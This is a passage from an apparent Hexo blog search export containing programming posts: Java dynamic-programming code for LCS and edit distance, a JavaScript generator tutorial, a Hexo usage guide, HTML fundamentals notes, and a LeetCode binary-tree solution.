<h4 id="自底向上"><a href="#自底向上" class="headerlink" title="自底向上"></a>自底向上</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lengthOfLCS</span><span class="params">(<span class="keyword">char</span>[] X, <span class="keyword">char</span>[] Y, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m == <span class="number">0</span> || n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span> || j == <span class="number">0</span>) dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(X[i - <span class="number">1</span>] == Y[j - <span class="number">1</span>]) dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> dp[i][j] = Math.max(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Edit-Distance"><a href="#Edit-Distance" class="headerlink" title="Edit Distance"></a>Edit Distance</h3><p>给定两个数组str1和str2，可以进行insert，remove和replace操作。找到将str1转换成str2的最少次数。所有操作代价相同。</p>
<h4 id="自顶向下-1"><a href="#自顶向下-1" class="headerlink" title="自顶向下"></a>自顶向下</h4><p>参数m和n分别代表当前处理的两个子串的长度，如果第一个字符串长度位0，只能进行n次insert操作；如果第二个字符串长度为0，只能进行m次remove操作。然后，如果我们已经计算过这个同等子串后，就简单返回。否则，有可能当前两个字符串末尾字符相同，这种情况下规模分别减1，因为当前位不消耗任何操作；还有可能当前两个字符串末尾字符不同，这个时候末尾字符一定要消耗一次操作，可以是insert，remove，replace三种操作中的一种，于是我们通过私有的min函数返回三个数值中最小的那个。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EditDistance</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">helper</span><span class="params">(String s1, String s2, <span class="keyword">int</span> m, <span class="keyword">int</span> n, <span class="keyword">int</span>[][] seen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> m;</span><br><span class="line">        <span class="keyword">if</span>(seen[m][n] != <span class="number">0</span>) <span class="keyword">return</span> seen[m][n];</span><br><span class="line">        <span class="keyword">if</span>(s1.charAt(m - <span class="number">1</span>) == s2.charAt(n - <span class="number">1</span>)) seen[m][n] = helper(s1, s2, m - <span class="number">1</span>, n - <span class="number">1</span>, seen);</span><br><span class="line">        <span class="keyword">else</span> seen[m][n] = <span class="number">1</span> + min(helper(s1, s2, m, n - <span class="number">1</span>, seen), helper(s1, s2, m - <span class="number">1</span>, n, seen), helper(s1, s2, m - <span class="number">1</span>, n - <span class="number">1</span>, seen));</span><br><span class="line">        <span class="keyword">return</span> seen[m][n];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(b &lt;= a &amp;&amp; b &lt;= c) <span class="keyword">return</span> b;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a &lt;= b &amp;&amp; a &lt;= c) <span class="keyword">return</span> a;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">editDist</span><span class="params">(String s1, String s2, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] seen = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> helper(s1, s2, m, n, seen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arga)</span> </span>&#123;</span><br><span class="line">        String str1 = <span class="string">"sunday"</span>;</span><br><span class="line">        String str2 = <span class="string">"saturday"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(editDist( str1 , str2 , str1.length(), str2.length()) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="自底向上-1"><a href="#自底向上-1" class="headerlink" title="自底向上"></a>自底向上</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">editDist</span><span class="params">(String s1, String s2, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>) dp[i][j] = j;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(j == <span class="number">0</span>) dp[i][j] = i;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s1.charAt(i - <span class="number">1</span>) == s2.charAt(j - <span class="number">1</span>)) dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> dp[i][j] = min(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>dynamic programming</tag>
      </tags>
  </entry>
  <entry>
    <title>generator</title>
    <url>/2019/02/13/generator/</url>
    <content><![CDATA[<h1 id="Generator函数"><a href="#Generator函数" class="headerlink" title="Generator函数"></a>Generator函数</h1><p>生成器函数作为ES6的新特性之一，已经并不是什么新鲜的概念了。在此之前，Python，Php等均有生成器的概念。其本质就是一个返回iterator的函数，通过yield关键字可以暂停函数的执行，并在下一次调用相关方法时继续函数的执行。</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">letterGenerator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'a'</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'b'</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'c'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> letterIterator = letterGenerator();</span><br><span class="line">letterIterator.next(); <span class="comment">// &#123;value: 'a', done: false&#125;</span></span><br><span class="line">letterIterator.next(); <span class="comment">// &#123;value: 'b', done: false&#125;</span></span><br><span class="line">letterIterator.next(); <span class="comment">// &#123;value: 'c', done: false&#125;</span></span><br><span class="line">letterIterator.next(); <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到通过调用生成器函数，我们得到了一个iterator对象。iterator对象包含next方法，可用于迭代iterable类型的数据。通过调用iterator的next方法，我们得到一个包含两个属性value和done的对象，用于标识我们的迭代过程，这也是generator函数最基本的用法。</p>
<a id="more"></a>

<h3 id="控制权传递"><a href="#控制权传递" class="headerlink" title="控制权传递"></a>控制权传递</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">controlTransfer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'a'</span>;</span><br><span class="line">  <span class="keyword">yield</span>* another();</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'d'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">another</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'b'</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'c'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和上面类似，只不过新增了<code>yield*</code>语法，通过这种方式，我们可以将generator函数的控制权转交给另外的generator函数。其实会发现，<code>yield*</code>后面跟着的应该是一个迭代器对象。</p>
<h3 id="可以接受参数的generator"><a href="#可以接受参数的generator" class="headerlink" title="可以接受参数的generator"></a>可以接受参数的generator</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">acceptParamGenerator</span>(<span class="params">param</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> word = <span class="keyword">yield</span> <span class="string">'hello '</span> + param;</span><br><span class="line">  <span class="keyword">yield</span> word + <span class="string">' world'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> iterator = acceptParamGenerator(<span class="string">'happy'</span>);</span><br><span class="line">iterator.next().value; <span class="comment">// 'hello happy'</span></span><br><span class="line">iterator.next(<span class="string">'hello'</span>).value; <span class="comment">// 'hello world'</span></span><br></pre></td></tr></table></figure>

<p>可以看到，我们通过这种方式可以和generator函数进行通信，我们首先调用<code>next</code>方法生成了第一个<code>yield</code>之后的内容，然后传递参数给<code>next</code>方法，其实这个参数会被yield左侧赋值的变量<code>word</code>接收。这样实现了在generator函数中的双向通讯，可以通过<code>yield</code>向外传参，也可以通过<code>next</code>向generator传参。</p>
<p>注意<code>next</code>方法只能给等待执行的<code>yield</code>传参，而不能给第一个<code>yield</code>传参，因为我们调用<code>next</code>方法的时候，第一个<code>yield</code>就会立刻执行。但是我们可以通过给generator函数本身传参，这样也可以实现类似的效果。</p>
<h3 id="向generator抛出异常"><a href="#向generator抛出异常" class="headerlink" title="向generator抛出异常"></a>向generator抛出异常</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">exceptionGenerator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">'a'</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> iterator = exceptionGenerator();</span><br><span class="line"><span class="built_in">console</span>.log(iterator.next().value); <span class="comment">// 'a'</span></span><br><span class="line">iterator.throw(<span class="string">'catch this'</span>); <span class="comment">// 'catch this'</span></span><br></pre></td></tr></table></figure>

<p>每一个iterator除了含有一个<code>next</code>方法之外，还有一个<code>throw</code>方法，用于向原generator函数抛出异常。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>generator</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Introduction</title>
    <url>/2018/10/03/hexo-brief-introduction/</url>
    <content><![CDATA[<p>This article focuses on how to use hexo to generate our static content management system, which is mostly from Youtube channel <a href="https://www.youtube.com/channel/UCvmINlrza7JHB1zkIOuXEbw" target="_blank" rel="noopener">Mike Dane</a>.Thanks for him!</p>
<a id="more"></a>

<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><ul>
<li>When we install hexo on our PC, we can run <code>hexo new [filename]</code> command in the directory of hexo to create a new post.The new generated content will be in the source/_post folder.</li>
<li>If we want to create a draft, we can run <code>hexo new draft [filename]</code> command in the directory of hexo.The new generated content will be in the source/_draft folder.</li>
<li>If we want to show draft on our local server, we can run <code>hexo server --draft</code> command to run a server while displaying the draft article, but if we run <code>hexo server</code> command then we can only see the post article.</li>
<li>If we want to draft file to be in post directory, we can use <code>hexo publish [draftname]</code>.</li>
<li>Hexo also supports the third option which is page. Suppose we want to write a ‘About me’ page, then we can use <code>hexo new page [filename]</code>.</li>
<li>According to above description, we find when we want to create a new post, we can only run <code>hexo new [filename]</code>. This default behavior is controlled by <strong>_config.yml</strong> file, which consists of a series of key-value pairs. In the writing section, we can change the default_layout. This must be one of the three options, which are post, draft or page.</li>
</ul>
<h2 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h2><p>Front-matter is a block of YAML or JSON at the beginning of the file that is used to configure settings for your writings. Front-matter is terminated by three dashes when written in YAML or three semicolons when written in JSON.</p>
<p>We can use front-matter to define <strong>title</strong>, <strong>date</strong> and <strong>tag</strong> in one article. Front-matter is only meta data, which is data about data.</p>
<h2 id="Scaffold"><a href="#Scaffold" class="headerlink" title="Scaffold"></a>Scaffold</h2><p>Scaffold folder saves the scaffold information about what we will create. Seeing that when create a new post, draft or page, we even do not set the front-matter, there are always some contents. This is what the scaffold do for us.</p>
<p>In the scaffold folder, we can create our own scaffold. Attention to the front curly braces, which is placeholder for the generated file. We can also add <code>post</code> to get current layout of the file.</p>
<h2 id="Tags-amp-Categories"><a href="#Tags-amp-Categories" class="headerlink" title="Tags &amp; Categories"></a>Tags &amp; Categories</h2><p>Tags and categories are two different ways to organize files in hexo. Categories apply to posts in order, resulting in a hierarchy of classifications and sub-classifications. Tags are all defined on the same hierarchical level so the order in which they appear is not important.</p>
<h2 id="Tag-Plugins"><a href="#Tag-Plugins" class="headerlink" title="Tag Plugins"></a>Tag Plugins</h2><p>Tag plugins are a quick way to add some specific contents into ouy posts. We can use <strong>‘codeblock’</strong> to begin a section of code, and <strong>‘endcodeblock’</strong> to end the section of code. We can also add youtube video in our website using tag plugins.</p>
<h2 id="Asset-Folder"><a href="#Asset-Folder" class="headerlink" title="Asset Folder"></a>Asset Folder</h2><p>We can put our own static files(i.e. images or PDF) into asset folder to have other people download them. But first we need to open <strong>_config.yml</strong> file and look at writing section, where we need to set the value of <strong>post_asset_folder</strong> to be true, which default is false.</p>
<p>After setting that, we can use asset folder to save our images or other static files, and can use curly braces grammar to get those resources. If we want to display the image itself, we can simply use <strong>asset_img</strong>. If we want a link to that image, we can use <strong>asset_link</strong>. If we want to get the path of that image, we can use <strong>asset_path</strong>. And after those three words, we simply put the filename of the image.</p>
<h2 id="Theme"><a href="#Theme" class="headerlink" title="Theme"></a>Theme</h2><p>The theme in hexo is only html, css and javascript files. We can link to official theme store to select one theme that we like, then we need to look at the theme’s github page and clone that repository to our local theme folder. We can run <code>git clone [http-address] [themes/theme-name]</code>, then we can simply open our <strong>_config.yml</strong> file, then change the value of theme to the new theme name.</p>
<h1 id="Create-our-theme"><a href="#Create-our-theme" class="headerlink" title="Create our theme"></a>Create our theme</h1><p>To create our own theme, we can simply new folder under the themes folder and name it our name of theme. Last we modify the _config.yml file to make that theme display.</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
  </entry>
  <entry>
    <title>html</title>
    <url>/2018/12/15/html/</url>
    <content><![CDATA[<h2 id="DOCTYPE"><a href="#DOCTYPE" class="headerlink" title="DOCTYPE"></a>DOCTYPE</h2><p>我们在编写html的时候往往第一行就是DOCTYPE的声明，那么这个DOCTYPE是什么呢？DOCTYPE=Document Type。也就是文档类型，众所周知，html作为一种在web时代使用的超文本标记语言，最基本的功能就是作为文档传达信息。</p>
<p>而html（1993）经过20几年的发展，其中发展出了众多标准，DOCTYPE的作用之一就是指明文档类型，如html的最新版本html5的DOCTYPE就是<code>!DOCTYPE html</code>。此外，在浏览器端，DOCTYPE还指明了其渲染文档的模式，明确说来就是是否采用怪异模式(quirks mode)渲染，与之对应的是标准模式(standard mode)，声明一个合法的DOCTYPE可以使得浏览器以标准模式渲染，至于渲染模式存在的原因还要归结于历史因素，简言之就是为了解决兼容性的问题。</p>
<p>DOCTYPE起初的目的是用作文档验证，我们在声明中指定一个DTD(Document Type Defination)的链接，该DTD用于解析和验证文档的合法性，而html5没有指定DTD，所以html5的DOCTYPE可以如此简洁。</p>
<p>附HTML4的DOCTYPE，<code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;https://www.w3.org/TR/html4/strict.dtd&quot;&gt;</code></p>
<a id="more"></a>

<h2 id="语义化-Semantic-HTML"><a href="#语义化-Semantic-HTML" class="headerlink" title="语义化(Semantic HTML)"></a>语义化(Semantic HTML)</h2><h3 id="语义化的概念"><a href="#语义化的概念" class="headerlink" title="语义化的概念"></a>语义化的概念</h3><p>谈及HTML，总免不了要提及语义化的概念。作为标记语言的HTML的基本元素就是element，这些element都有自己特定的含义，开发者应遵循标签本身的固有语义来编写HTML。还是举个例子，比如我们看到nav标签就可以知道这个是一个导航元素。</p>
<h3 id="语义化的意义"><a href="#语义化的意义" class="headerlink" title="语义化的意义"></a>语义化的意义</h3><p>我们学习一个新概念的时候，首先要从感性的角度来学习这个概念，更重要的是，我们要知道为什么会产生这个概念，存在必有其合理性，也就是这个概念存在的意义到底是什么呢？大体上，语义化有以下三个意义：</p>
<ul>
<li>提升可读性与可维护性</li>
<li>搜索引擎优化(SEO)</li>
<li>提升无障碍性(Accessibility)</li>
</ul>
<h2 id="扩展性"><a href="#扩展性" class="headerlink" title="扩展性"></a>扩展性</h2><p>我们不仅可以通过html标准去编写html，也可以自定义化我们自己的html文档，这就是html的可扩展性，具体体现在以下方面：</p>
<ul>
<li>meta</li>
<li>data-*</li>
<li>link</li>
<li>JSON-LD   </li>
</ul>
<h3 id="meta扩展"><a href="#meta扩展" class="headerlink" title="meta扩展"></a>meta扩展</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 指定HTTP Header --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">"script-src 'self'"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SEO 搜索引擎优化 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">"关键词"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">"页面介绍"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 移动设备Viewport --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"initial-scale=1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 关闭iOS电话号码自动识别 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"telphone=no"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 360浏览器指定内核 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 指定IE渲染模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此外，MDN也提及关于一些站点在社交媒体的分享的展示优化，比如facebook的og(open graph data)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">property</span>=<span class="string">"og:image"</span> <span class="attr">content</span>=<span class="string">"https://developer.cdn.mozilla.net/static/img/opengraph-logo.dc4e08e2f6af.png"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">property</span>=<span class="string">"og:description"</span> <span class="attr">content</span>=<span class="string">"The Mozilla Developer Network (MDN) provides</span></span></span><br><span class="line"><span class="tag"><span class="string">information about Open Web technologies including HTML, CSS, and APIs for both Web sites</span></span></span><br><span class="line"><span class="tag"><span class="string">and HTML5 Apps. It also documents Mozilla products, like Firefox OS."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">property</span>=<span class="string">"og:title"</span> <span class="attr">content</span>=<span class="string">"Mozilla Developer Network"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在CNN这样的新闻站点的meta标签中也有体现，因为网站的流量可能不仅来自于搜索引擎，还有很大一部分来自于类似facebook或者微博这样的社交媒体分享，而我们在meta标签中应用各个媒体的规则，就可以在这样的社交媒体分享中展示更定制化的信息预览。</p>
<h3 id="data"><a href="#data" class="headerlink" title="data-*"></a>data-*</h3><p>可以通过data前缀标签自定义属性，并且可以通过dataset api获取html中这些自定义的属性，格式为元素.dataset.*。dataset本质就是一个map的数据结构。</p>
<h3 id="link"><a href="#link" class="headerlink" title="link"></a>link</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入 CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"style.css"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 浏览器预加载 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//example.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"image.png"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prerender"</span> <span class="attr">href</span>=<span class="string">"http://example.com"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- favicon --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">type</span>=<span class="string">"image/png"</span> <span class="attr">href</span>=<span class="string">"myicon.png"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- RSS --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 供阅读器订阅RSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"alternate"</span> <span class="attr">type</span>=<span class="string">"application/rss+xml"</span> <span class="attr">href</span>=<span class="string">"/feed"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>rel意指relationship，表明外链文档和当前文档的关系(relationship)。浏览器预加载的意义是增强站点的性能，通过预先加载某些资源，提前下载的方式使得后续对这些资源的访问更快。这有一篇讲述prefetch等的文章<a href="https://css-tricks.com/prefetching-preloading-prebrowsing/" target="_blank" rel="noopener">prefetch</a></p>
<h3 id="JSON-LD"><a href="#JSON-LD" class="headerlink" title="JSON-LD"></a>JSON-LD</h3><p>JSON-LD意思就是JavaScript对象标记-链接数据(Javascript object notation-link data)，是为了向搜索引擎提供更好的页面爬取和展示。关于JSON-LD，这有一篇很好的文章<a href="https://moz.com/blog/json-ld-for-beginners" target="_blank" rel="noopener">JSON-LD</a></p>
<h2 id="Web无障碍-Accessibility"><a href="#Web无障碍-Accessibility" class="headerlink" title="Web无障碍(Accessibility)"></a>Web无障碍(Accessibility)</h2><p>让任何人不因为身体心理，技术缺陷，都能够平等的获取网页上的媒体内容</p>
<ul>
<li>WCAG(Web Content Accessibility Guideline)</li>
<li>ARIA(Accessible Rich Internet Application)</li>
</ul>
<h3 id="提升无障碍性"><a href="#提升无障碍性" class="headerlink" title="提升无障碍性"></a>提升无障碍性</h3><ul>
<li>为<code>img</code>提供<code>alt</code>属性：<code>img</code>无法正常显示的替代性文本</li>
<li><code>noscript</code>:提供一种禁用JS之后的替代方案</li>
<li><code>input</code>和<code>label</code>对应：扩大表单的点击范围</li>
<li>图形验证码与语音验证码：对视力障碍或者听力障碍者友好</li>
<li>文字和背景有足够对比度</li>
<li>键盘可操作：对用鼠标不方便的用户友好，不许在弹出层的下面一层focus</li>
</ul>
]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-100</title>
    <url>/2019/01/22/leetcode-100/</url>
    <content><![CDATA[<h1 id="Same-tree"><a href="#Same-tree" class="headerlink" title="Same tree"></a>Same tree</h1><p>Given two binary trees, write a function to check if they are the same or not.</p>
<p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          &#x2F; \       &#x2F; \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          &#x2F;           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          &#x2F; \       &#x2F; \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>

<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>检查给定两个二叉树是否为结构相同且对应值相等的相同二叉树。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">p</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">q</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;boolean&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> isSameTree = <span class="function"><span class="keyword">function</span>(<span class="params">p, q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">null</span> &amp;&amp; q == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">null</span> || q == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(p.val == q.val) &#123;</span><br><span class="line">        <span class="keyword">return</span> isSameTree(p.left, q.left) &amp;&amp; isSameTree(p.right, q.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-103</title>
    <url>/2019/01/22/leetcode-103/</url>
